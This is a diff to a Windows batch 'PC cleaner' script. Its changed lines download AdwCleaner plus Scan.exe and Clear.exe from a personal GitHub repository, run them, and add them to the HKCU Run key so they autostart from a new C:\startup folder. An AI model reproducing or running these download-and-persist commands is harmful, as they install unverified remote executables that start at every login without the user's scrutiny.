@@ -144,10 +144,10 @@ if %sva%== no goto :menu
 :1212
 cls
 echo install.........
-powershell.exe Invoke-WebRequest -Uri "https://adwcleaner.malwarebytes.com/adwcleaner?channel=release" -OutFile "c:\adw.exe"
-powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan.exe" -OutFile "c:\Scan.exe"
-C:\adw.exe /preinstalled
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "c:\Scan.exe"
+powershell.exe Invoke-WebRequest -Uri "https://adwcleaner.malwarebytes.com/adwcleaner?channel=release" -OutFile "C:\startup\adw.exe"
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan.exe" -OutFile "C:\startup\Scan.exe"
+C:\startup\adw.exe /preinstalled
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "C:\startup\Scan.exe"
 set /p wda=" start scan virus yes or no? > "
 if %wda%== yes goto :adw
 if %wda%== no goto :menu
@@ -590,7 +590,9 @@ echo Cleaning PC...
 del /s /q Clear.exe
 cls
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Clear.exe" -OutFile "Clear.exe"
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "Clear.exe"
+mkdir C:\startup
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Clear.exe" -OutFile "C:\startup\Clear.exe"
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "C:\startup\Clear.exe"
 Clear.exe /k
 ping -n 4.5 127.0.0.1>nul
 cls
